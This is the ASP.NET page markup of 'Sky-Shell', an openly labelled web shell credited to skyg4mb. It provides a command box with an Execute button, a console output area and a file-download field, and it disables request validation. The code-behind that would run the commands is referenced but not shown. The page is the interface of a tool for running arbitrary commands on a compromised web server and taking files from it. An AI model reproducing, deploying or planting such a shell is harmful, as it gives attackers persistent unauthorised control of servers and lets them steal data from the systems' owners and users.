<%@ Page Language="C#" AutoEventWireup="true" CodeFile="skyshell.aspx.cs" Inherits="skyshell" ValidateRequest="false" %>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>Sky-Shell</title>
    <h1>Sky-Shell</h1>
</head>
<body>
    <form id="form1" runat="server">
        <div>
                       
            <asp:TextBox ID="__txtcommand" runat="server" Width="302px"></asp:TextBox>
            <asp:Button ID="Button1" runat="server" Text="Execute" Width="111px" OnClick="Button1_Click" />
        </div>
        <div>
            <asp:TextBox ID="__txt_console" runat="server" Height="600px" TextMode="MultiLine" Width="800px"></asp:TextBox>
        </div>
        <div>
            Path: <asp:TextBox ID="__txtpath" runat="server" Width="302px"></asp:TextBox>
            <asp:Button ID="Button2" runat="server" Text="Download" Width="111px" OnClick="Button2_Click" />
            <asp:Label ID="lblMensaje" runat="server"></asp:Label>
        </div>
    </form>
    <label>Design by: skyg4mb Bajo Licencia GPL</label>
</body>
    
</html>

